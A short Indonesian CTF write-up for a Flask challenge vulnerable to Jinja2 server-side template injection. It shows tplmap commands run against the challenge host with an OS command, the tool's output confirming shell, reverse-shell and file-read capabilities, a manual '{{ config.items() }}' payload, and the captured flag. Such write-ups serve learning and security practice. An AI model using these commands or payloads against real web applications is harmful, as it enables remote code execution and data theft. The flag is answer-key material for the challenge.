Mimin baru ajaa nih buat Website menggunakan Flask :D, Silahkan dicoba-coba nih.

Link : http://103.157.96.13:7785/


Referensi
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
https://github.com/epinna/tplmap

Dengan Tools
```
git clone https://github.com/epinna/tplmap
cd tplmap
python2 -m pip install req.txt
python2 tplmap.py -u 'http://103.157.96.13:7785/?nama=KKKKK' --os-cmd "ls -la"

[+] Testing if GET parameter 'nama' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: nama
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

total 28
dr-xr-xr-x 1 ctf  ctf  4096 Dec 17 04:57 .
drwxr-xr-x 1 root root 4096 Dec 17 04:57 ..
-rw-r--r-- 1 ctf  ctf   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ctf  ctf  3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 ctf  ctf   807 Feb 25  2020 .profile
-rw-r--r-- 1 root root  601 Dec 17 04:41 server.py
drwxr-xr-x 1 root root 4096 Dec 17 04:58 templates

```


Manual Payload
```
{{ config.items() }}
```

Flag:
```
CTFR{s0m3_s3rv3r_s1d3_t3mpl4t3_1nj3ct10n}
```